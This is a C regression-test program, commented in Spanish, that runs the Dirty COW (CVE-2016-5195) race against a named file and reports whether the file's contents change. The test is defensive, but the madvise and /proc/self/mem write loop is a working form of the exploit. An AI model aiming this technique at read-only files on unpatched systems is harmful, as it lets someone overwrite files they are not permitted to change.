// SPDX-License-Identifier: GPL-2.0
/*
 * race_cow.c - Prueba de regresión de condiciones de carrera sobre páginas
 * privadas (Copy-On-Write) de un archivo mapeado.
 *
 * Reproduce el PATRÓN de Dirty COW (CVE-2016-5195) sobre un archivo de prueba
 * para verificar que el kernel actual NO permite que la carrera alcance el
 * archivo en disco/page cache:
 *
 *   hilo A:  madvise(MADV_DONTNEED) en bucle  -> descarta la copia COW privada
 *   hilo B:  escribe en la región privada en bucle
 *              modo "procmem": vía /proc/self/mem (escritura forzada,
 *                              FOLL_FORCE, sobre un mapeo de SOLO lectura)
 *              modo "direct":  vía puntero sobre un mapeo PROT_WRITE privado
 *
 * En kernels vulnerables (< 4.8.3), el modo procmem podía terminar escribiendo
 * en la página del page cache del archivo (de solo lectura). En el kernel
 * actual, la ruta GUP con FOLL_FORCE solo escribe en páginas anónimas
 * exclusivas (PageAnonExclusive, desde 5.19; antes FOLL_COW), así que el
 * archivo debe quedar intacto.
 *
 * Uso: race_cow <archivo> <procmem|direct> <segundos>
 * Salida: 0 = archivo intacto, 1 = mmap/escritura denegados (defensa activa),
 *         2 = error, 3 = ARCHIVO CORRUPTO.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

static char           *map;
static size_t          map_len;
static atomic_int      stop;
static unsigned long   n_madvise, n_writes, n_write_errors;
static int             use_procmem;
static const char      payload[] = "ESCRITURA-NO-AUTORIZADA";

static void *madvise_loop(void *arg)
{
	(void)arg;
	while (!atomic_load(&stop)) {
		madvise(map, map_len, MADV_DONTNEED);
		n_madvise++;
	}
	return NULL;
}

static void *write_loop(void *arg)
{
	int memfd = -1;

	(void)arg;
	if (use_procmem) {
		memfd = open("/proc/self/mem", O_RDWR);
		if (memfd < 0) {
			perror("open /proc/self/mem");
			atomic_store(&stop, 1);
			return NULL;
		}
	}
	while (!atomic_load(&stop)) {
		if (use_procmem) {
			if (pwrite(memfd, payload, sizeof(payload) - 1,
				   (off_t)(uintptr_t)map) < 0)
				n_write_errors++;
		} else {
			memcpy(map, payload, sizeof(payload) - 1);
		}
		n_writes++;
	}
	if (memfd >= 0)
		close(memfd);
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t ta, tb;
	struct stat st;
	char *original, *after;
	int fd, secs, prot;

	if (argc != 4 || (strcmp(argv[2], "procmem") && strcmp(argv[2], "direct"))) {
		fprintf(stderr, "uso: %s <archivo> <procmem|direct> <segundos>\n", argv[0]);
		return 2;
	}
	use_procmem = !strcmp(argv[2], "procmem");
	secs = atoi(argv[3]);

	fd = open(argv[1], O_RDONLY);
	if (fd < 0 || fstat(fd, &st) != 0 || st.st_size == 0) {
		perror("open/fstat");
		return 2;
	}
	map_len = (size_t)st.st_size;

	/* Instantánea del contenido original (vía read, no vía mmap) */
	original = malloc(map_len);
	after = malloc(map_len);
	if (!original || !after || pread(fd, original, map_len, 0) != (ssize_t)map_len) {
		perror("pread");
		return 2;
	}

	/* procmem: mapeo de SOLO lectura (como en Dirty COW).
	 * direct:  mapeo privado escribible (COW) desde un fd O_RDONLY. */
	prot = use_procmem ? PROT_READ : PROT_READ | PROT_WRITE;
	map = mmap(NULL, map_len, prot, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED) {
		printf("DENEGADO  mmap(%s): %s\n", use_procmem ? "R, MAP_PRIVATE" :
		       "RW, MAP_PRIVATE", strerror(errno));
		return (errno == EPERM || errno == EACCES) ? 1 : 2;
	}

	pthread_create(&ta, NULL, madvise_loop, NULL);
	pthread_create(&tb, NULL, write_loop, NULL);
	sleep((unsigned)secs);
	atomic_store(&stop, 1);
	pthread_join(ta, NULL);
	pthread_join(tb, NULL);

	munmap(map, map_len);

	/* Releer el archivo desde el page cache, sin el mapeo */
	if (pread(fd, after, map_len, 0) != (ssize_t)map_len) {
		perror("pread");
		return 2;
	}
	close(fd);

	printf("modo=%s segundos=%d madvise=%lu escrituras=%lu errores_escritura=%lu -> ",
	       argv[2], secs, n_madvise, n_writes, n_write_errors);
	if (memcmp(original, after, map_len) == 0) {
		printf("ARCHIVO INTACTO\n");
		return 0;
	}
	printf("ARCHIVO CORRUPTO\n");
	return 3;
}
